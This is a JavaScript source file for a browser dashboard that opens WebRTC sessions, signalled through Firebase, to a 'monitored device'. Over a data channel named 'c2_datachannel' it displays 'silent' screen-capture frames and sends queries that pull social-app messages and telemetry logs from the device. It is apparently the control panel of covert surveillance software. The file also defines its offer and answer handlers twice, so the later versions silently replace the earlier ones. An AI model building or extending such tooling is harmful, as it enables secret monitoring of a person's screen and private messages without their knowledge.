// webrtc-manager.js - Browser WebRTC P2P Manager (Perfect Negotiation & RTCDataChannel Engine)

let pc = null;
let dc = null;
let activeSessionId = null;
let polite = true; // Dashboard is the Polite Peer
let makingOffer = false;
let ignoreOffer = false;

function initWebRtcSession(sessionId, isInitiator) {
    activeSessionId = sessionId;
    console.log(`[WebRTC Manager] Initializing Session: ${sessionId} (Initiator: ${isInitiator})`);

    const rtcConfig = {
        iceServers: [
            { urls: "stun:stun.l.google.com:19302" },
            { urls: "stun:stun1.l.google.com:19302" },
            { urls: "stun:stun2.l.google.com:19302" },
            { urls: "stun:stun.relay.metered.ca:80" }
        ]
    };

    pc = new RTCPeerConnection(rtcConfig);

    pc.onicecandidate = ({ candidate }) => {
        if (candidate) {
            sendIceCandidateToFirebase(sessionId, candidate);
        }
    };

    pc.ontrack = (event) => {
        console.log("[WebRTC Manager] Received Remote Media Track", event.streams[0]);
        const videoElement = document.getElementById("webstreamPlayer");
        if (videoElement && event.streams[0]) {
            videoElement.srcObject = event.streams[0];
            videoElement.play().catch(e => console.warn("Video play error:", e));
        }
    };

    pc.ondatachannel = (event) => {
        dc = event.channel;
        setupDataChannelEvents(dc);
    };

    if (isInitiator) {
        dc = pc.createDataChannel("c2_datachannel", { ordered: true });
        setupDataChannelEvents(dc);
        postSessionRequestedToFirebase(sessionId);
    }

    pc.oniceconnectionstatechange = () => {
        console.log("[WebRTC Manager] ICE Connection State:", pc.iceConnectionState);
        if (pc.iceConnectionState === "disconnected" || pc.iceConnectionState === "failed") {
            console.warn("[WebRTC Manager] PeerConnection disconnected. Transitioning to Firebase Relay Bus fallback...");
            const connBadge = document.getElementById("connectionModeBadge");
            if (connBadge) {
                connBadge.className = "badge bg-warning bg-opacity-10 text-warning border border-warning px-3 py-2";
                connBadge.innerHTML = '<i class="fa-solid fa-triangle-exclamation me-1"></i>Reconnecting P2P...';
            }
        }
    };

    pc.onnegotiationneeded = async () => {
        try {
            makingOffer = true;
            await pc.setLocalDescription();
            sendSdpOfferToFirebase(sessionId, pc.localDescription);
        } catch (err) {
            console.error("[WebRTC Manager] Negotiation error:", err);
        } finally {
            makingOffer = false;
        }
    };

    subscribeFirebaseSignalingEvents(sessionId);
}

function setupDataChannelEvents(channel) {
    try {
        channel.bufferedAmountLowThreshold = 131072;
    } catch (_) {}

    channel.onopen = () => {
        console.log("[WebRTC Manager] P2P RTCDataChannel OPEN 🟢");
        const statusBadge = document.getElementById("p2pStatusBadge");
        if (statusBadge) statusBadge.innerText = "P2P DataChannel Active 🟢";

        const connBadge = document.getElementById("connectionModeBadge");
        if (connBadge) {
            connBadge.className = "badge bg-success bg-opacity-10 text-success border border-success px-3 py-2";
            connBadge.innerHTML = '<i class="fa-solid fa-bolt me-1 text-warning"></i>P2P WebRTC Direct ⚡';
        }
    };

    channel.onclose = () => {
        console.log("[WebRTC Manager] P2P RTCDataChannel CLOSED");
        const connBadge = document.getElementById("connectionModeBadge");
        if (connBadge) {
            connBadge.className = "badge bg-info bg-opacity-10 text-info border border-info px-3 py-2";
            connBadge.innerHTML = '<i class="fa-solid fa-cloud me-1 text-info"></i>Firebase Relay Bus 🟢';
        }
    };

    channel.onmessage = (event) => {
        try {
            const data = JSON.parse(event.data);
            if (data.type === "SCREEN_FRAME" && data.payload && data.payload.frame) {
                renderSilentScreencapFrame(data.payload.frame);
            } else if (data.type === "DB_RESPONSE_SOCIAL" && data.payload && data.payload.messages) {
                handleP2pSocialDatabaseResponse(data.payload.appKey, data.payload.messages);
            } else if (data.type === "DB_RESPONSE_TELEMETRY" && data.payload && data.payload.logs) {
                handleP2pTelemetryDatabaseResponse(data.payload.category, data.payload.logs);
            }
        } catch (e) {
            console.log("[WebRTC Manager] P2P Message Received:", event.data);
        }
    };
}

function queryP2pLocalDatabase(queryType, keyParam) {
    if (dc && dc.readyState === "open") {
        const payload = queryType === "SOCIAL" ? { type: "DB_QUERY_SOCIAL", appKey: keyParam } : { type: "DB_QUERY_TELEMETRY", category: keyParam };
        dc.send(JSON.stringify(payload));
        console.log(`[WebRTC P2P DB Query] Dispatched P2P Database Request: ${queryType} (${keyParam})`);
    }
}

function renderSilentScreencapFrame(base64Frame) {
    const canvas = document.getElementById("liveScreenCanvas");
    if (!canvas) return;
    const ctx = canvas.getContext("2d");
    const img = new Image();
    img.onload = () => {
        ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
    };
    img.src = base64Frame.startsWith("data:") ? base64Frame : `data:image/jpeg;base64,${base64Frame}`;
}

async function handleRemoteOfferSignal(offerSdp) {
    if (!pc) return;
    const offer = new RTCSessionDescription({ type: "offer", sdp: offerSdp });
    const offerCollision = makingOffer || pc.signalingState !== "stable";
    ignoreOffer = !polite && offerCollision;
    if (ignoreOffer) return;

    if (offerCollision) {
        await pc.setLocalDescription({ type: "rollback" });
    }
    await pc.setRemoteDescription(offer);
    await pc.setLocalDescription();
    sendSdpAnswerToFirebase(activeSessionId, pc.localDescription);
}

async function handleRemoteAnswerSignal(answerSdp) {
    if (!pc) return;
    const answer = new RTCSessionDescription({ type: "answer", sdp: answerSdp });
    await pc.setRemoteDescription(answer);
}

function postSessionRequestedToFirebase(sessionId) {
    const uid = currentUser ? currentUser.uid : "default_user";
    const devId = activeDeviceId || "DEV_MONITORED_DEVICE";
    const sessionData = {
        status: "REQUESTED",
        requestedCapabilities: ["SCREEN", "DATA"],
        timestamp: Date.now()
    };
    firebase.database().ref(`users/${uid}/devices/${devId}/webrtc_signaling/sessions/${sessionId}`).update(sessionData);
}

function sendSdpOfferToFirebase(sessionId, desc) {
    const uid = currentUser ? currentUser.uid : "default_user";
    const devId = activeDeviceId || "DEV_MONITORED_DEVICE";
    const offerPayload = {
        type: desc.type,
        sdp: desc.sdp,
        revision: 1
    };
    firebase.database().ref(`users/${uid}/devices/${devId}/webrtc_signaling/sessions/${sessionId}/offer`).set(offerPayload);
}

function sendSdpAnswerToFirebase(sessionId, desc) {
    const uid = currentUser ? currentUser.uid : "default_user";
    const devId = activeDeviceId || "DEV_MONITORED_DEVICE";
    firebase.database().ref(`users/${uid}/devices/${devId}/webrtc_signaling/sessions/${sessionId}/answer`).set({
        type: desc.type,
        sdp: desc.sdp,
        revision: 1
    });
}

function sendIceCandidateToFirebase(sessionId, candidate) {
    const uid = currentUser ? currentUser.uid : "default_user";
    const devId = activeDeviceId || "DEV_MONITORED_DEVICE";
    firebase.database().ref(`users/${uid}/devices/${devId}/webrtc_signaling/sessions/${sessionId}/candidates`).push({
        sender: "DASHBOARD",
        candidate: candidate.candidate,
        sdpMid: candidate.sdpMid,
        sdpMLineIndex: candidate.sdpMLineIndex
    });
}

let pendingIceCandidates = [];

function addRemoteCandidateOrBuffer(candData) {
    const rtcCand = new RTCIceCandidate(candData);
    if (pc && pc.remoteDescription && pc.remoteDescription.type) {
        pc.addIceCandidate(rtcCand).catch(e => console.warn("[WebRTC Candidate Add Error]", e));
    } else {
        pendingIceCandidates.push(rtcCand);
        console.log("[WebRTC Candidate Buffered] Queued early ICE candidate prior to remoteDescription");
    }
}

async function drainPendingIceCandidates() {
    if (!pc || !pc.remoteDescription || pendingIceCandidates.length === 0) return;
    console.log(`[WebRTC Candidate Drain] Flushing ${pendingIceCandidates.length} buffered ICE candidates...`);
    for (const cand of pendingIceCandidates) {
        try {
            await pc.addIceCandidate(cand);
        } catch (e) {
            console.warn("[WebRTC Buffered Candidate Error]", e);
        }
    }
    pendingIceCandidates = [];
}

function subscribeFirebaseSignalingEvents(sessionId) {
    const uid = currentUser ? currentUser.uid : "default_user";
    const devId = activeDeviceId || "DEV_MONITORED_DEVICE";
    const sessionRef = firebase.database().ref(`users/${uid}/devices/${devId}/webrtc_signaling/sessions/${sessionId}`);

    sessionRef.on("value", snapshot => {
        const val = snapshot.val();
        if (!val) return;

        if (val.answer && val.answer.sdp && !val.answerProcessed) {
            sessionRef.child("answerProcessed").set(true);
            handleRemoteAnswerSignal(val.answer.sdp);
        }

        if (val.offer && val.offer.sdp && !val.offerProcessed) {
            sessionRef.child("offerProcessed").set(true);
            handleRemoteOfferSignal(val.offer.sdp);
        }

        if (val.candidates) {
            Object.keys(val.candidates).forEach(key => {
                const cand = val.candidates[key];
                if (cand.sender !== "DASHBOARD" && !cand.processed) {
                    sessionRef.child(`candidates/${key}/processed`).set(true);
                    addRemoteCandidateOrBuffer(cand);
                }
            });
        }
    });
}

async function handleRemoteOfferSignal(sdp) {
    if (!pc) return;
    try {
        const offerCollision = (makingOffer || pc.signalingState !== "stable");
        ignoreOffer = !polite && offerCollision;
        if (ignoreOffer) {
            console.log("[WebRTC Perfect Negotiation] Impolite peer ignoring colliding offer");
            return;
        }

        const offerDesc = new RTCSessionDescription({ type: "offer", sdp: sdp });
        await pc.setRemoteDescription(offerDesc);
        await drainPendingIceCandidates();

        const answer = await pc.createAnswer();
        await pc.setLocalDescription(answer);

        if (activeSessionId) {
            sendSdpAnswerToFirebase(activeSessionId, pc.localDescription);
        }
    } catch (err) {
        console.error("[WebRTC Manager] Error handling remote offer signal:", err);
    }
}

async function handleRemoteAnswerSignal(sdp) {
    if (!pc) return;
    try {
        const answerDesc = new RTCSessionDescription({ type: "answer", sdp: sdp });
        await pc.setRemoteDescription(answerDesc);
        await drainPendingIceCandidates();
        console.log("[WebRTC Manager] Successfully installed Remote Answer SDP");
    } catch (err) {
        console.error("[WebRTC Manager] Error handling remote answer signal:", err);
    }
}

function startP2pWebStreamSession() {
    const sessId = "sess_" + Date.now();
    initWebRtcSession(sessId, true);
    console.log("[WebRTC Manager] Dispatched WebRTC P2P Session Request:", sessId);
}

function stopP2pWebStreamSession() {
    console.log("[WebRTC Manager] Stopping WebRTC P2P Session:", activeSessionId);
    try {
        if (activeSessionId) {
            const uid = currentUser ? currentUser.uid : "default_user";
            const devId = activeDeviceId || "DEV_MONITORED_DEVICE";
            firebase.database().ref(`users/${uid}/devices/${devId}/webrtc_signaling/sessions/${activeSessionId}`).update({
                status: "TERMINATED",
                terminatedAt: Date.now()
            });
        }
        if (dc) { try { dc.close(); } catch (_) {} dc = null; }
        if (pc) { try { pc.close(); } catch (_) {} pc = null; }
    } catch (e) {
        console.warn("[WebRTC Teardown Error]", e);
    } finally {
        activeSessionId = null;
        pendingIceCandidates = [];
        const connBadge = document.getElementById("connectionModeBadge");
        if (connBadge) {
            connBadge.className = "badge bg-info bg-opacity-10 text-info border border-info px-3 py-2";
            connBadge.innerHTML = '<i class="fa-solid fa-cloud me-1 text-info"></i>Firebase Relay Bus 🟢';
        }
        const statusBadge = document.getElementById("p2pStatusBadge");
        if (statusBadge) statusBadge.innerText = "P2P Session Idle";
    }
}
